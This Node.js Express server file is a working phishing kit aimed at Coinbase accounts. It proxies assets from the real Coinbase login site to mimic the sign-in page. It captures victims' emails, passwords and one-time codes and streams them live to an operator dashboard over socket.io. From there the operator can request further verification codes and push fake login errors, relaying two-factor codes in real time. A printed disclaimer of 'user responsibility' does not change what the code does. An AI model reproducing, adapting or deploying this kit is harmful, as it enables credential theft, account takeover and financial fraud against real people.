
const express = require('express');
const path = require('path');
const axios = require('axios');
const session = require('express-session');
const cookieParser = require('cookie-parser');
const { Server } = require('socket.io');
const { v4: uuidv4 } = require('uuid');
const app = express();

app.use(cookieParser());
app.use(session({
  secret: 'hellomamitscoinbase',
  resave: false,
  saveUninitialized: true
}));

app.use(express.static(path.join(__dirname)));
app.use(express.json());

const activeUsers = new Map();

app.get(/^\/assets\/(.+)$/, async (req, res) => {
  try {
    const assetPath = req.params[0];
    const response = await axios.get(`https://login.coinbase.com/assets/${assetPath}`, {
      responseType: 'arraybuffer',
    });
    res.set('Content-Type', response.headers['content-type']);
    res.send(response.data);
  } catch (error) {
    console.error('Error fetching asset:', error.message);
    res.status(500).send('Error fetching asset');
  }
});

app.get('/admin', (req, res) => {
  if (req.session.adminLoggedIn) {
    res.sendFile(path.join(__dirname, 'admin.html'));
  } else {
    res.sendFile(path.join(__dirname, 'admin-login.html'));
  }
});

app.post('/admin/login', (req, res) => {
  const { username, password } = req.body;
  
  const ADMIN_USERNAME = 'username';
  const ADMIN_PASSWORD = 'password';
  
  if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
    req.session.adminLoggedIn = true;
    res.json({ success: true });
  } else {
    res.json({ success: false, message: 'Invalid credentials' });
  }
});

app.post('/admin/logout', (req, res) => {
  req.session.adminLoggedIn = false;
  res.json({ success: true });
});

app.get('/user-page/:userId', (req, res) => {
  const userId = req.params.userId;
  const userInfo = activeUsers.get(userId);
  if (userInfo) {
    res.sendFile(path.join(__dirname, 'index.html'));
  } else {
    res.status(404).send('User not found');
  }
});

app.post('/track', (req, res) => {
  const { email, password, otp } = req.body;
  const userId = req.session.userId || uuidv4();
  req.session.userId = userId;

  const userInfo = {
    id: userId,
    email,
    password,
    otp,
    loginTime: new Date().toISOString(),
    lastActive: new Date().toISOString(),
    currentUrl: req.headers.referer || '',
    lastAction: 'Login',
    verificationState: 'pending',
    otpAttempts: []
  };

  activeUsers.set(userId, userInfo);
  io.emit('userUpdate', Array.from(activeUsers.values()));
  res.json({ success: true });
});

app.post('/verify-response', (req, res) => {
  const { userId, type, response } = req.body;
  const userInfo = activeUsers.get(userId);
  if (userInfo) {
    userInfo.verificationType = type;
    userInfo.verificationResponse = response;
    userInfo.otp = response;
    userInfo.otpAttempts.push({
      code: response,
      timestamp: new Date().toISOString()
    });
    activeUsers.set(userId, userInfo);
    io.emit('userUpdate', Array.from(activeUsers.values()));
    res.json({ success: true });
  } else {
    res.status(404).json({ success: false });
  }
});

app.post('/activity', (req, res) => {
  const { url, action } = req.body;
  const userId = req.session.userId;

  if (userId && activeUsers.has(userId)) {
    const userInfo = activeUsers.get(userId);
    userInfo.lastActive = new Date().toISOString();
    userInfo.currentUrl = url;
    userInfo.lastAction = action;

    activeUsers.set(userId, userInfo);
    io.emit('userActivity', {
      userId,
      url,
      action,
      timestamp: new Date().toISOString()
    });
  }

  res.json({ success: true });
});

const server = app.listen(5000, '0.0.0.0', () => {
  console.log('ANY MISUSE OF THIS CODE IS UNDER USER RESPONSBILITY http://0.0.0.0:5000');
});

const io = new Server(server);

io.on('connection', (socket) => {
  socket.emit('userUpdate', Array.from(activeUsers.values()));

  socket.on('disconnect', () => {
    for (const [userId, user] of activeUsers.entries()) {
      if ((new Date() - new Date(user.lastActive)) > 1000 * 60 * 5) {
        activeUsers.delete(userId);
      }
    }
    io.emit('userUpdate', Array.from(activeUsers.values()));
  });

  socket.on('watchUser', async (userId) => {
    if (activeUsers.has(userId)) {
      const userInfo = activeUsers.get(userId);
      io.emit('userActivity', {
        userId,
        url: userInfo.currentUrl,
        action: userInfo.lastAction,
        timestamp: new Date().toISOString()
      });
    }
  });

  socket.on('requestVerification', (data) => {
    const { userId, type, identifier } = data;
    if (activeUsers.has(userId)) {
      io.emit('verificationRequest', { userId, type, identifier });
    }
  });

  socket.on('sendError', (data) => {
    const { userId, type } = data;
    if (activeUsers.has(userId)) {
      io.emit('loginError', { userId, type });
    }
  });

  socket.on('requestUserData', () => {
    socket.emit('userUpdate', Array.from(activeUsers.values()));
  });
});
